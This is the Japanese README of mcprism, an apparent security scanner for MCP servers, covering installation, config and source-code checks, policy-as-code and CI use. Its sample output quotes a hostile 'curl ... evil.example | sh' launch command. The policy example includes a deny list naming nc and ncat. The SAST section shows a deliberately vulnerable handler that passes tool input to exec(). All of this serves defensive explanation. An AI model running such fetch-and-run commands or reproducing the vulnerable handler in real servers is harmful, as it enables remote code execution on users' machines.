<div align="center">

<p><a href="../../README.md">English</a> · <a href="../../README.zh-CN.md">简体中文</a> · 日本語 · <a href="README.ko-KR.md">한국어</a> · <a href="README.fr-FR.md">Français</a> · <a href="README.de-DE.md">Deutsch</a> · <a href="README.es-ES.md">Español</a> · <a href="README.ru-RU.md">Русский</a> · <a href="README.ar-SA.md">العربية</a></p>

<img src="../../assets/logo.svg" width="128" height="128" alt="mcprism logo">

# mcprism

**MCPサーバーをAIに接続する前に、セキュリティリスクを確認しましょう。**

Claude、Cursor、VS Code などの AI クライアントで MCP サーバーを使っている方は、mcprism で接続前に設定とローカルソースを確認できます。ライブのツールメタデータ検査は、明示的に有効にした場合のみ実行されます。MCP サーバーを使っていなければ、今のところ mcprism は必要ありません。

mcprism は [Model Context Protocol](https://modelcontextprotocol.io/) サーバー向けのセキュリティスキャナーです。サーバーを 3 つの角度から確認します。

1. **設定** — クライアントがどのように起動・接続するか。バージョン固定されたパッケージ、平文通信、設定内の認証情報、クラウドメタデータやプライベートネットワークへの接続を確認します。
2. **ソースコード** — 実装が手元にある場合、JS/TS/Python/Go/Rust のツールハンドラーを読み、エージェントが制御できる引数を危険なシンクまで追跡します。プロセス実行、外部リクエスト（SSRF）、ファイルシステムパスに加え、eval、安全でないデシリアライズ、ハードコードされたシークレットを検出します。
3. **ランタイム** — MCP ハンドシェイクを行い、ツール、リソース、プロンプトを一覧表示し、ツールメタデータのポイズニングを確認します。ツールを呼び出すことはありません。

すべてのサーバーに検出項目、0〜100 のスコア、A〜F のグレードを表示します。mcprism は実行時依存のない Go 製単一バイナリです。ローカル設定・ソースコードのスキャンはオフラインで実行でき、Registry コマンドは公式 MCP Registry から公開メタデータを取得します。

[![CI](https://github.com/HUA503/mcprism/actions/workflows/ci.yml/badge.svg)](https://github.com/HUA503/mcprism/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/HUA503/mcprism?color=a6e3a1&label=release)](https://github.com/HUA503/mcprism/releases)
[![Go Report Card](https://goreportcard.com/badge/github.com/HUA503/mcprism)](https://goreportcard.com/report/github.com/HUA503/mcprism)
[![Go version](https://img.shields.io/badge/go-1.25-89b4fa?logo=go&logoColor=white)](https://go.dev)
[![License](https://img.shields.io/github/license/HUA503/mcprism?color=cba6f7)](../../LICENSE)

</div>

---

<p align="center">
  <img src="../../assets/demo.gif" alt="mcprism scanning MCP servers in a terminal" width="78%">
</p>

<p align="center">
  <img src="../../assets/tui.png" alt="mcprism interactive terminal UI" width="86%">
</p>

MCP は AI エージェントを外部サーバーに接続し、ツール、ファイル、データを利用できるようにします。このプロトコルは Claude Desktop と Claude Code、Cursor、VS Code、Windsurf などに組み込まれているため、通常の環境ではすぐに複数のサーバーに接続します。これらのサーバーはコマンドを実行し、ファイルシステムを読み、あなたのプロンプトを見ることができます。悪意のある、または過剰な権限を持つサーバーは、認証情報を盗み、コマンドを実行し、返すテキストを通じてエージェントを誘導する可能性があります。mcprism は、エージェントに使わせる前にサーバーごとのレポートとスコアを提供します。イメージに対して `trivy` を実行するようなものです。

<p align="center">
  <img src="../../assets/comparison.png" alt="Before and after using mcprism" width="100%">
</p>

## 2 行でクイックスタート

```sh
curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh
mcprism demo
```

```powershell
# Windows PowerShell
irm https://raw.githubusercontent.com/HUA503/mcprism/main/install.ps1 | iex
mcprism demo
```

内蔵デモはオフラインで動作し、設定を読み込んだりサーバーを起動したり
しません。実際に設定済みの MCP サーバーをスキャンするには
`mcprism scan` を実行してください。

## 1 行でサーバーを審査

設定に追加することなく、起動コマンド、URL、パッケージ、または手元のコードを確認します。

```sh
mcprism vet -- npx -y some-mcp-server
mcprism vet https://mcp.example.com
mcprism vet npm:@scope/name
mcprism vet ./path/to/server     # ソースツリーを審査
mcprism vet server.py            # 1 ファイルを審査
```

`vet` はデフォルトで静的解析のみを行い、対象を実行しません。`--probe` を付けると起動してツール、リソース、プロンプトを列挙します。ソースツリーやファイルは以下の SAST エンジンで処理され、ネットワークは不要です。

<p align="center">
  <img src="../../assets/vet.png" alt="mcprism vet catching a curl|sh launch command" width="94%">
</p>

## 目次

- [変更履歴](../../CHANGELOG.md)
- [攻撃面の解説](../MCP-ATTACK-SURFACE.md)
- [ローンチキット](../LAUNCH-KIT.md)
- [できること](#できること)
- [利用シーン](#利用シーン)
- [レポート](#レポート)
- [インストール](#インストール)
- [クイックスタート](#クイックスタート)
- [出力例](#出力例)
- [ポリシー・アズ・コード](#ポリシーアズコード)
- [ソースコードレビュー（SAST）](#ソースコードレビューsast)
- [検出内容](#検出内容)
- [出力フォーマット](#出力フォーマット)
- [対応クライアントとトランスポート](#対応クライアントとトランスポート)
- [CI/CD](#cicd)
- [仕組み](#仕組み)
- [比較](#比較)
- [よくある質問](#よくある質問)
- [ロードマップ](#ロードマップ)
- [コントリビュート](#コントリビュート)

## できること

- 1 つのバイナリ。Python や Node のセットアップ、LLM API キー、アカウントは不要です。
- 静的・ソース・ライブ解析。設定を読み、コードがある場合は JS/TS/Python/Go/Rust ソースをレビューし、MCP ハンドシェイクを行ってツール、リソース、プロンプトを列挙します。ツールを呼び出すことはありません。
- ポリシー・アズ・コード。ルールのオン/オフ、重要度の変更、パッケージ・コマンド・ドメインの許可/拒否、ネットワーク分離の要求ができます。組み込みプロファイルには `default`、`strict`、`ci` のベースラインがあります。
- リスク許容レジスタ。理由と期限を付けて検出項目を抑制できます。抑制された項目はレポートに表示され続け、期限が切れると再び報告されます。
- ツール定義ロック。確認済みツールの名前と SHA-256 指紋を保存し、追加・削除・定義変更を検知して失敗します。ロックには説明やスキーマを保存しません。保存と検証時にサーバーへ接続してツール一覧を取得しますが、ツールは実行しません。
- 決定論的。35 のルールが OWASP MCP01〜MCP07 に対応します。ツールメタデータの検査では、簡体字・繁体字中国語の一般的なプロンプトインジェクションパターンも検出します。ローカルの設定・ソースコード検査はオフラインで実行され、Registry コマンドは公式 Registry の公開メタデータを取得します。テレメトリはありません。
- 人とマシン向けのレポート：table、JSON、Markdown、HTML、SARIF、JUnit XML、CycloneDX SBOM、CSV。
- 複数の対象を一度にスキャン：ファイル、ディレクトリ（再帰）、URL。

## 利用シーン

- MCP サーバーをインストール済みで、エージェントが実行する前にアクセス範囲を知りたい。`mcprism scan` を実行してください。
- チームでサーバー群を共有し、文書化されたベースラインが欲しい。`policy.yml` をバージョン管理し、本番マシンで `--profile strict` を実行してください。
- CI で変更をレビューしたい。`mcprism scan --profile ci` を実行すると high 以上でビルドを失敗させ、SARIF をコードスキャンに公開できます。
- MCP Registry のサーバーをクライアントに追加する前に、公式カタログで検索し、公開された起動・接続情報を確認したい場合。`mcprism registry search <キーワード>` で検索し、`mcprism registry scan <名前>` で1件を確認できます。`mcprism registry audit <キーワード>` は一致した複数の項目をまとめて静的監査します。サーバーは起動・接続しません。

## レポート

<p align="center">
  <img src="../../assets/screenshot-dynamic.png" alt="mcprism HTML report for a live server" width="86%">
</p>

多数のサーバーを一括レビュー（静的モード）：

<p align="center">
  <img src="../../assets/screenshot-static.png" alt="mcprism HTML report across many servers" width="70%">
</p>

## インストール

```sh
# ワンラインインストーラ（Linux / macOS）
curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh
```

```powershell
# Windows PowerShell
irm https://raw.githubusercontent.com/HUA503/mcprism/main/install.ps1 | iex
```

```sh
# Go
go install github.com/HUA503/mcprism/cmd/mcprism@latest
```

Homebrewでインストール（ソースからビルド）：

```sh
brew tap HUA503/mcprism https://github.com/HUA503/mcprism
brew install HUA503/mcprism/mcprism
```

または[リリース](https://github.com/HUA503/mcprism/releases)ページからバイナリをダウンロードしてください（Linux/macOS/Windows は amd64 と arm64、さらに Linux ARMv7）。Windows では `scoop bucket add mcprism https://github.com/HUA503/mcprism`、`scoop install mcprism/mcprism` でインストールできます。

Nix flakes を使うと、Linux または macOS（x86_64、aarch64）で `main` の最新版をインストールできます。

```sh
nix profile install github:HUA503/mcprism
nix run github:HUA503/mcprism -- scan
```

Linux と macOS で `/usr/local/bin` に書き込めない場合、インストーラは `~/.local/bin` にインストールします。このディレクトリが PATH にないというメッセージが表示されたら、PATH に追加するか、`~/.local/bin/mcprism scan` を直接実行してください。

## クイックスタート

```sh
# Claude、Codex、Gemini CLI、OpenCode、Roo Code、Cursor、VS Code、Windsurf などの設定を自動検出
mcprism scan

# 特定の設定ファイル
mcprism scan ~/.claude.json
mcprism scan ~/.codex/config.toml

# ディレクトリを再帰的にスキャン
mcprism scan ./configs

# リモートサーバー
mcprism scan https://mcp.example.com/v1

# 複数の対象をまとめて
mcprism scan a.json b.json ./configs

# 完全オフライン / 静的のみ（プロセスを起動せず、接続もしない）
mcprism scan mcp.json

# ベースラインやカスタムポリシーを適用
mcprism scan --profile strict
mcprism scan --policy policy.yml --suppressions suppressions.yml

# 対話型ターミナル UI
mcprism scan -i

# 設定を書かずに起動コマンド / URL / パッケージを審査
mcprism vet -- npx -y some-mcp-server
mcprism vet "uvx some-mcp-server"
mcprism vet https://mcp.example.com
mcprism vet npm:@scope/name
mcprism vet --probe -- npx -y some-mcp-server   # 実際に起動してツールを一覧

# 参考情報
# 公式 MCP Registry を検索し、公開メタデータを静的監査
mcprism registry search filesystem
mcprism registry scan io.github.user/server-name
mcprism registry audit filesystem --all --limit 100 --require-complete --format sarif --output registry.sarif

# 確認済みツールの定義をロックして後続の変更を検知
mcprism inventory save one-server.json --output server.tools.lock.json
mcprism inventory verify one-server.json --baseline server.tools.lock.json
```

`--all` を付けると、検索結果のページを最後まで取得します。監査の一部が省略された場合に失敗させるには `--require-complete` を付けてください。これは公開メタデータのみを監査し、サーバーは起動しません。

mcprism inspect mcp.json     # サーバーのツール/リソース/プロンプトを一覧
mcprism rules                # 組み込みルールを一覧
mcprism profiles             # 組み込みプロファイルを一覧
```

### シェル補完

`mcprism completion` は Bash、Zsh、Fish、PowerShell 用の補完スクリプトを生成します。現在のシェルで次のコマンドを実行してください。

- Bash / Zsh：`source <(mcprism completion bash)` / `source <(mcprism completion zsh)`
- Fish：`mcprism completion fish | source`
- PowerShell：`mcprism completion powershell | Out-String | Invoke-Expression`

新しいセッションでも有効にするには、該当するコマンドをシェルの設定ファイルに追加します。

### フラグ

| フラグ | 説明 |
|---|---|
| `-f, --format` | `table`（既定） · `json` · `sarif` · `md` · `html` · `junit` · `cyclonedx` · `csv` |
| `-o, --output` | レポートをファイルに書き出す |
| `-p, --policy` | ポリシー YAML ファイルのパス |
| `--profile` | 組み込みプロファイル：`default` · `strict` · `ci` |
| `--suppressions` | 抑制 YAML ファイルのパス |
| `--no-dynamic` | 静的解析のみ。プロセスを起動せず接続もしない |
| `--fail-on` | `critical` / `high` / `medium` / `low` で非ゼロ終了 |
| `--timeout` | サーバーごとのハンドシェイクタイムアウト（既定 `10s`） |
| `-i, --interactive` | TUI で検出項目を閲覧 |
| `--transport` | URL に対して `http`（Streamable HTTP）または `sse`（旧版）を強制 |
| `--probe`（`vet`） | 実際に起動/接続してツールを列挙。対象を実行するためサンドボックス推奨 |

## 出力例

静的モードで 2 つのローカルサーバーをスキャン：

```text
◆ mcprism   v0.20.0 · 2026-11-25
────────────────────────────────────────────────
 A  notes  ◌ static only
  npx -y @acme/notes-mcp@2.0.1
  capabilities: none
  ✓ No issues detected

 F  shell  ◌ static only
  bash -c curl -s https://evil.example/x | sh
  capabilities: SHELL · NET
  CRIT MCP104  Remote code fetched and executed by shell
  CRIT MCP301  Command execution combined with network access
────────────────────────────────────────────────
2 servers · 2 findings
2 CRIT  0 HIGH  0 MED  0 LOW
```

HTML と SARIF 形式では証拠、修正アドバイス、OWASP マッピングが追加されます。

## ポリシーアズコード

ポリシーファイルはバージョン付きの YAML ドキュメントです。合格/不合格の条件を設定し、個別ルールを上書きし、許可/拒否するパッケージ・コマンド・ドメインを列挙し、ファイルやシェルアクセスを持つサーバーが外部へ通信しないよう要求できます。

```yaml
version: "1"
fail:
  on: high
  grade: B
  score: 70
rules:
  MCP106:
    severity: high
allow:
  packages: ["@modelcontextprotocol/*"]
deny:
  commands: [nc, ncat]
  domains: ["*.ngrok.io"]
capabilities:
  requireNetworkIsolation: true
```

deny に一致すると `MCP700` として報告され、分離下でネットワークアクセスを持つファイル/シェルサーバーは `MCP701` として報告されます。[`examples/policy.yml`](../../examples/policy.yml)、[`examples/suppressions.yml`](../../examples/suppressions.yml)、[ポリシーガイド](../POLICIES.md)を参照してください。コンプライアンスゲートと機械可読出力については [docs/COMPLIANCE.md](../COMPLIANCE.md) をご覧ください。

## ソースコードレビュー（SAST）

設定はサーバーの起動方法を示すもので、ハンドラーが引数で何をするかまでは示しません。設定では問題なさそうなサーバーでも、ツールパラメータをそのままシェルに渡したり、リクエスト URL として使ったり、それを元にパスを開くことがあります。これらの不具合は実装の中にあるため、mcprism はコードを読みます。

`vet` をチェックアウト先や単一ファイルに向けてください。ビルド手順、インストール済みの依存、ネットワークは不要です。

```sh
mcprism vet ./mcp-server
mcprism vet ./mcp-server/src/tool.ts
```

一般的な SDK とフレームワークを認識します。

- JavaScript/TypeScript：`@modelcontextprotocol/sdk` の `McpServer`、低レベルの `Server.setRequestHandler`、各種 `.tool(...)` 登録。
- Python：`FastMCP` の `@mcp.tool()` デコレータ、低レベルの `call_tool` ハンドラー。

各ツールについてハンドラー引数を攻撃者が制御するデータとして扱い、パターンベースのヒューリスティック分析でシンクまで追跡します。検出項目にはファイルと行番号が示され、コードを表示し、修正方法を説明します。

| ルール | シンク | 既定 |
|---|---|---|
| MCP801 | ツール入力がプロセス/コマンドシンクに到達（`exec`、`spawn`、`os.system`、`subprocess shell=True`） | critical |
| MCP802 | ツール入力がリクエスト URL を制御（`fetch`、`requests`、`httpx`）— SSRF | high |
| MCP803 | ツール入力が制限なしにファイルシステムパスとして使われる | high |
| MCP804 | 動的コード実行（`eval`、`Function`、`exec`） | high |
| MCP805 | 安全でないデシリアライズ（`pickle`、`marshal`、`yaml.load`） | high |
| MCP806 | ソース内にハードコードされた認証情報 | high |

誤検出を減らすため、一般的な安全パターンを認識し、それらがある場合は報告しません。

JavaScript/TypeScript、Python、Go では、単純なローカルエイリアスと、同じファイル内の一意なヘルパー関数へ渡される引数を追跡します。JS/TS は関数宣言とブロック本体を持つアロー関数を認識します。Rust は公式 `rmcp #[tool]` メソッドを認識し、メソッド内のローカルエイリアスを追跡しますが、ヘルパー呼び出しやマクロ展開は追跡しません。

- 固定コマンドと配列で渡された引数（`execFile(cmd, args)`、`subprocess.run([...])`）。シェル文字列ではなく。
- パスの制限：`path.resolve(base, name)` を `startsWith(base)` で確認、Python では `realpath` + `startswith`。
- エージェントがホストを選ぶのではなく固定のベース URL、さらに `yaml.safe_load` / `SafeLoader`。

次のハンドラーはエージェントがコマンドを制御できるため MCP801 が付きます。

```js
server.tool("run", { command: z.string() }, async ({ command }) => {
  exec(command, (err, stdout) => callback(stdout));
});
```

修正版は許可リストを使い、シェルを実行しません。

```js
const ALLOWED = { status: ["git", "status"], log: ["git", "log", "-5"] };
server.tool("git", { name: z.string() }, async ({ name }) => {
  const spec = ALLOWED[name];
  if (!spec) throw new Error("not allowed");
  const [cmd, ...args] = spec;
  return execFile(cmd, args);
});
```

エンジンはパターンベースで 1 レベルの taint 追跡を行い、サードパーティのパーサーを使わないため、バイナリは小さく自己完結しています。完全なデータフロー解析ツールが捉えるすべてを検出できるわけではなく、ほとんどの MCP サーバーの不具合にある短く直接的なハンドラーからシンクへのパスを対象としています。ルールの詳細とその他の例は [docs/SAST.md](../SAST.md) にあります。

<p align="center">
  <img src="../../assets/sast.png" alt="mcprism source-code review findings" width="94%">
</p>

## 検出内容

- 設定内のシークレット。認識できる認証情報の形式（AWS、Google、GitHub、Slack、Stripe、GitLab、OpenAI、JWT など）を種類ごとに示し、生成されたキーに見える高エントロピーの値を疑わしいシークレットとして報告します。プレースホルダーや `${ENV_VAR}` 参照は報告しません。
- 平文通信と無効化された TLS（`http://`、`NODE_TLS_REJECT_UNAUTHORIZED=0`）。
- 過剰な権限。`/` やホームディレクトリにマウントされたファイルシステムサーバー、オフにされたサンドボックスや権限チェック。
- ツールポイズニング。ツール名、説明、schema にある注入指示、零幅/双方向 Unicode、隠された HTML/Markdown、エンコードされた塊。
- 危険な能力の組み合わせ。シェル + ネットワーク、ファイル読み取り + ネットワーク、ファイル書き込み + シェルなど。
- ネットワーク対象。クラウドメタデータエンドポイント（`169.254.169.254`）やプライベート/ループバック範囲。
- サプライチェーンリスク：バージョン未固定のパッケージ、タイポスクワット、リモート URL から直接実行されるコード。
- ポリシー違反：拒否されたパッケージ・コマンド・ドメイン、ネットワーク分離の不備。
- JS/TS/Python/Go/Rust ハンドラーのソースコード上の欠陥：コマンド、ネットワーク、ファイルシンクに到達するツール引数、eval/exec、安全でないデシリアライズ、ハードコードされたシークレット。[ソースコードレビュー](#ソースコードレビューsast)を参照。
- Rust の対応範囲は公式 `rmcp #[tool]` メソッドと、プロセス・`reqwest` URL・ファイル・シークレットの検査に限られます。
- サーバー間のツール名の衝突、分類された接続失敗（DNS / TLS / 接続拒否 / タイムアウト / コマンドなし）。

完全な一覧と OWASP 対照は [docs/RULES.md](../RULES.md) にあります。

## 出力フォーマット

| フォーマット | 主な用途 |
|---|---|
| `table` | ターミナル出力 |
| `json` | カスタムツール |
| `sarif` | GitHub コードスキャン |
| `md` | Markdown レポート / チケット |
| `html` | 共有可能な単体レポート |
| `junit` | Jenkins、GitLab、GitHub のテストレポート |
| `cyclonedx` | SBOM / 脆弱性取り込み |
| `csv` | スプレッドシートや GRC ワークフロー |

## 対応クライアントとトランスポート

mcprism は Claude Desktop、Claude Code、GitHub Copilot CLI、Zed、Cursor、VS Code（GitHub Copilot Chat）、Windsurf、Cline、Continue などが使う JSON/JSONC MCP 設定を読み取り、`mcpServers` オブジェクトと配列の両形式に対応します。3 種類すべての MCP トランスポート（stdio、Streamable HTTP、旧 HTTP+SSE）をサポートします。

Codex の MCP TOML 設定にも対応しています。グローバル設定では `$CODEX_HOME/config.toml`（未設定時は `~/.codex/config.toml`）、プロジェクト設定では `.codex/config.toml` と `config.toml` を検出します。
システム設定も検出します。Unix では `/etc/codex/config.toml`、Windows では `%ProgramData%/OpenAI/Codex/config.toml` を確認します。


Gemini CLI のユーザー設定（`~/.gemini/settings.json`）、プロジェクト設定（`.gemini/settings.json`）、システム設定も自動検出します。

OpenCode にも対応しています。`opencode.json(c)` の `mcp.servers` を解析し、ユーザー、プロジェクト、システムの設定を検出します。

## CI/CD

`ci` プロファイルでパイプライン内の危険なサーバーをブロック：

```yaml
- name: Audit MCP servers
  run: |
    curl -fsSL https://raw.githubusercontent.com/HUA503/mcprism/main/install.sh | sh
    mcprism scan mcp.json --profile ci
```

SARIF で GitHub コードスキャンに公開：

```yaml
- name: Scan & upload
  run: mcprism scan mcp.json -f sarif -o mcp.sarif
- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: mcp.sarif
```

JUnit 出力は Jenkins や GitLab のテストレポート手順で使え、CycloneDX 出力は SBOM や脆弱性トラッカーに渡せます。

## 仕組み

```mermaid
flowchart TD
  A[Targets: auto-discover / files / directories / URLs / source trees] --> B[Analysis]
  B --> B1[Config rules<br/>static · capability · supply-chain · network]
  B --> B2[Source SAST<br/>tool args to command · SSRF · path sinks]
  B --> B3[MCP handshake<br/>list tools, resources, prompts; poisoning checks]
  B1 --> D[Policy enforcement<br/>overrides · allow/deny · network isolation]
  B2 --> D
  B3 --> D
  D --> E[Suppressions<br/>accepted risk with reason and expiry]
  E --> F[Score 0-100, grade A-F, compliance gate]
  F --> G[Report<br/>table · json · sarif · md · html · junit · cyclonedx · csv]
```

mcprism は能力を列挙するだけなので、解析に副作用はありません。同梱のデモサーバー（`examples/testserver`）は危険な動作をシミュレートするだけで実際には実行しません。パッケージ構成とデータフローは [docs/ARCHITECTURE.md](../ARCHITECTURE.md) に記載しています。

## 比較

公開されたプロジェクトの説明に基づきます（機能は変わる可能性があります）：

| | **mcprism** | mcp-scan | mcp-audit | 人手によるレビュー |
|---|---|---|---|---|
| 言語 / ランタイム | Go、単一バイナリ | Python | Python/Node | — |
| インストール/実行時依存ゼロ | ✅ | ❌ | ❌ | — |
| 静的設定レビュー | ✅ | ✅ | 部分的 | ❌ |
| ライブ能力の列挙 | ✅ | 部分的 | 部分的 | ❌ |
| ソースコード SAST（ハンドラーからシンクの taint） | ✅ | ❌ | ❌ | ❌ |
| ツールポイズニング検出 | ✅ | ✅ | 部分的 | ❌ |
| 能力組み合わせのモデル化 | ✅ | ❌ | ❌ | ❌ |
| ポリシー・アズ・コード（許可/拒否/分離） | ✅ | ❌ | ❌ | ❌ |
| JUnit / CycloneDX / CSV 出力 | ✅ | ❌ | ❌ | ❌ |
| 再帰・複数対象スキャン | ✅ | 部分的 | ❌ | ❌ |
| SARIF + CI 終了コード | ✅ | ✅ | ❌ | ❌ |
| ローカル設定・コードスキャンはオフライン、LLM 不使用 | ✅ | ✅ | 部分的 | ✅ |
| クロスプラットフォーム | ✅ | 部分的 | 部分的 | — |

## よくある質問

**mcprism はツールを呼び出しますか？**
いいえ。MCP の初期化と一覧取得のみを行います。ツールを呼び出さず、サーバー経由でファイルを開かず、プロンプトも送信しません。

**データをどこかに送信しますか？**
テレメトリはありません。ローカルの設定・レポートはアップロードされません。Registry コマンドは検索語またはサーバー名を公式 MCP Registry に送り、公開メタデータを取得します。`registry audit` は検索語を送り、一致する項目の公開メタデータをまとめて取得します。その他の静的スキャンは接続しません。ライブスキャン（`scan --dynamic` / `vet --probe`）は指定したサーバーに接続します。

**mcp-scan や mcp-audit との違いは？**
後者は Python や Node で動き、設定やポイズニングに焦点を当てています。mcprism は Go の単一バイナリで、能力の組み合わせをモデル化し、ポリシー・アズ・コードを実行し、SARIF に加え JUnit、CycloneDX、CSV を出力します。[比較表](#比較)を参照してください。

**自分の環境では誤検出です。どうすれば？**
可能なら根本原因を修正し、それが難しければ理由と期限を付けて抑制してください。抑制された項目は表示され続け、期限が切れると再び報告されます。[docs/POLICIES.md](../POLICIES.md) を参照。

**レポートがきれいならサーバーは安全ですか？**
いいえ。mcprism は既知で観測可能なリスクを報告するもので、サーバーが安全であることを証明できません。信頼できるサーバーだけを実行してください。

## ロードマップ

- [ ] MCP 仕様の進展に合わせてルールを追加し誤検出を減らす
- [x] MCP レジストリ / マーケットプレイスのスキャン
- [ ] ポリシー上書きを超えたユーザー定義ルール
- [x] pre-commit フック
- [x] GitHub Actions と SARIF 出力
- [ ] エディタ連携（VS Code、JetBrains）
- [x] Scoop パッケージ
- [x] Homebrew formula
- [x] Nix パッケージ
- [x] `rmcp` ツールの Rust SAST
- [ ] SAST 対応言語の拡充（Java、C#）
- [ ] オプトインの複数ホップ／関数間 taint 追跡
- [ ] ライブ探査用の組み込みサンドボックス

## コントリビュート

Issue と PR を歓迎します。良いルール貢献は、信号が明確で決定論的、誤検出率の低いチェックです。`internal/rules` の下に追加し、OWASP MCP リスクにマップしてテストを含めてください。コード構成は [docs/ARCHITECTURE.md](../ARCHITECTURE.md) にあります。PR を開く前に `go vet ./... && go test ./...` を実行してください。

## ライセンス

[MIT](../../LICENSE) © mcprism contributors.

mcprism は防御ツールです。リスクを報告するもので、サーバーが安全であることを証明できず、レポートがきれいでも、よく分からないサーバーを信頼する理由にはなりません。

